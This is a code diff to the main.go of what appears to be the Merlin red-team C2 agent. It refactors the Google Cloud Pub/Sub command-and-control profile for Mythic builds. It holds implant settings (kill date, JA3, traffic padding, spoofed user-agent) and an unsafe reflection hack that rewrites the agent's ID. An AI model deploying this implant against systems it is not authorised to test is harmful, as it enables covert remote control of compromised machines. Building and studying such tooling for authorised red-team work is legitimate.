@@ -22,7 +22,6 @@ package main
 
 import (
 	// Standard
-	"encoding/json" // Added for parsing transport_config.json in pubsub case
 	"fmt"
 	"os"
 	"reflect"
@@ -68,7 +67,7 @@ var ja3 string
 var killdate = "0"
 
 // maxretry the number of failed connections to the server before the agent will quit running
-var maxretry = "500"
+var maxretry = "7"
 
 // padding the maximum size for random amounts of data appended to all messages to prevent static message sizes
 var padding = "4096"
@@ -111,29 +110,22 @@ var useragent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KH
 // verbose a boolean value that determines if the Agent will print verbose output
 var verbose = "false"
 
-// PubSub-specific variables (injected at build time by Mythic)
-var gcpProjectID = ""
-var serverToAgentTopic = ""
-var agentToServerTopic = ""
-var serverToAgentSub = ""
-var agentToServerSub = ""
+// PubSub-specific variables
+var projectID = ""
+var resultsTopic = ""
+var tasksSubscription = ""
 var credentialsJSON = ""
-var encryptionMode = "" // "aes256_hmac", "rsa", or "none"
+var encryptionMode = ""
 
-// setAgentID uses reflection to override the agent's private id field
-// This is necessary because Mythic expects the agent to use the payloadID,
-// but agent.New() generates a random UUID
 func setAgentID(a interface{}, newID uuid.UUID) error {
 	v := reflect.ValueOf(a).Elem()
 	t := v.Type()
 
-	// Find UUID field by type (field names are obfuscated)
 	var idField reflect.Value
 	var fieldIndex int = -1
 
 	for i := 0; i < v.NumField(); i++ {
 		fieldType := t.Field(i).Type.String()
-		// Look for UUID type (will be like "DPzPMG5.UUID" or "uuid.UUID")
 		if strings.Contains(fieldType, "UUID") {
 			idField = v.Field(i)
 			fieldIndex = i
@@ -145,22 +137,20 @@ func setAgentID(a interface{}, newID uuid.UUID) error {
 	}
 
 	if fieldIndex == -1 {
-		// Debug: Print all available field names
 		if core.Verbose {
-			color.Yellow("[DEBUG] UUID field not found. Available fields:")
+			color.Yellow("[Merlin] [main.go] UUID field not found. Available fields:")
 			for i := 0; i < v.NumField(); i++ {
 				color.Yellow(fmt.Sprintf("  - %s (type: %s)", t.Field(i).Name, t.Field(i).Type))
 			}
 		}
-		return fmt.Errorf("UUID field not found in agent struct")
+		return fmt.Errorf("[Merlin] [main.go] UUID field not found in agent struct")
 	}
 
-	// Make the private field writable using unsafe
 	idField = reflect.NewAt(idField.Type(), unsafe.Pointer(idField.UnsafeAddr())).Elem()
 	idField.Set(reflect.ValueOf(newID))
 
 	if core.Verbose {
-		color.Cyan(fmt.Sprintf("[*] Agent UUID successfully set to payloadID: %s", newID.String()))
+		color.Cyan(fmt.Sprintf("[Merlin] [main.go] Agent UUID successfully set to payloadID: %s", newID.String()))
 	}
 
 	return nil
@@ -225,7 +215,7 @@ func main() {
 			clientConfig.Protocol = "http"
 		} else {
 			if core.Verbose {
-				color.Red("unable to detect valid protocol from URL: " + url)
+				color.Red("[Merlin] [main.go] Unable to detect valid protocol from URL: " + url)
 				os.Exit(1)
 			}
 		}
@@ -239,53 +229,26 @@ func main() {
 			os.Exit(1)
 		}
 	case "pubsub":
-		// GCP Pub/Sub C2 profile client configuration
-		var pubsubConfig Config
+		maxretry = "500"
+		var cfg Config
 
-		// Check if build-time variables are set (Mythic build) or use config file (standalone build)
-		if gcpProjectID != "" && serverToAgentTopic != "" && agentToServerTopic != "" {
-			// Build-time variables injected by Mythic - use them
-			pubsubConfig = Config{
-				ProjectID:       gcpProjectID,
-				TasksTopic:      serverToAgentTopic,      // Server publishes tasks here
-				ResultsTopic:    agentToServerTopic,       // Agent publishes results here
-				SubscriptionID:  serverToAgentSub,         // Agent subscribes to tasks
-				CredentialsJSON: credentialsJSON,
+		if projectID != "" && resultsTopic != "" && tasksSubscription != "" {
+			cfg = Config{
+				ProjectID:          projectID,
+				ResultsTopic:       resultsTopic,
+				TasksSubscription:  tasksSubscription,
+				CredentialsB64JSON: credentialsJSON,
 			}
 			if core.Verbose {
-				color.Cyan("[*] Using build-time configuration (Mythic build)")
-			}
-		} else {
-			// No build-time variables - load config from transport_config.json (standalone mode)
-			var configData []byte
-			configData, err = os.ReadFile("transport_config.json")
-			if err != nil {
-				if core.Verbose {
-					color.Red(fmt.Sprintf("failed to read transport_config.json: %s", err.Error()))
-				}
-				os.Exit(1)
-			}
-
-			// Parse the JSON config into Config struct
-			err = json.Unmarshal(configData, &pubsubConfig)
-			if err != nil {
-				if core.Verbose {
-					color.Red(fmt.Sprintf("failed to parse transport_config.json: %s", err.Error()))
-				}
-				os.Exit(1)
-			}
-			if core.Verbose {
-				color.Cyan("[*] Using config file (standalone build)")
+				color.Cyan("[Merlin] [main.go] Using build-time configuration (Mythic build)")
 			}
 		}
 
-		// For Mythic integration, override the agent's UUID to use the payloadID
-		// This ensures Mythic recognizes the agent and messages are accepted
 		if payloadID != "" {
 			payloadUUID, err := uuid.Parse(payloadID)
 			if err != nil {
 				if core.Verbose {
-					color.Red(fmt.Sprintf("failed to parse payloadID: %s", err.Error()))
+					color.Red(fmt.Sprintf("[Merlin] [main.go] failed to parse payloadID: %s", err.Error()))
 				}
 				os.Exit(1)
 			}
@@ -293,38 +256,34 @@ func main() {
 			err = setAgentID(&a, payloadUUID)
 			if err != nil {
 				if core.Verbose {
-					color.Red(fmt.Sprintf("failed to set agent ID: %s", err.Error()))
+					color.Red(fmt.Sprintf("[Merlin] [main.go] failed to set agent ID: %s", err.Error()))
 				}
 				os.Exit(1)
 			}
 
 			if core.Verbose {
-				color.Cyan(fmt.Sprintf("[*] Agent UUID set to payloadID: %s", payloadID))
+				color.Cyan(fmt.Sprintf("[Merlin] [main.go] Agent UUID set to payloadID: %s", payloadID))
 			}
 		}
 
-		// Create pubsub client using the config and agent ID (use payloadID for Mythic)
-		client, err = NewPubSubClient(&pubsubConfig, payloadID, psk, encryptionMode)
+		client, err = NewPubSubClient(&cfg, payloadID, psk, encryptionMode)
 		if err != nil {
 			if core.Verbose {
-				color.Red(fmt.Sprintf("failed to create pubsub client: %s", err.Error()))
+				color.Red(fmt.Sprintf("[Merlin] [main.go] failed to create pubsub client: %s", err.Error()))
 			}
 			os.Exit(1)
 		}
 
 		if core.Verbose {
-			color.Green("[+] PubSub client initialized successfully")
+			color.Green("[Merlin] [main.go] PubSub client initialized successfully")
 		}
-
-		// Note: Removed manual listener loop - not needed for async clients
-		// run.Run() handles message processing through its main loop
 	default:
 		if core.Verbose {
-			color.Red(fmt.Sprintf("unknown C2 profile: %s", profile))
+			color.Red(fmt.Sprintf("[Merlin] [main.go] unknown C2 profile: %s", profile))
 		}
 		os.Exit(1)
 	}
 
-	// Start the agent - run.Run() blocks and handles everything
+	// Start the agent
 	run.Run(a, client)
 }
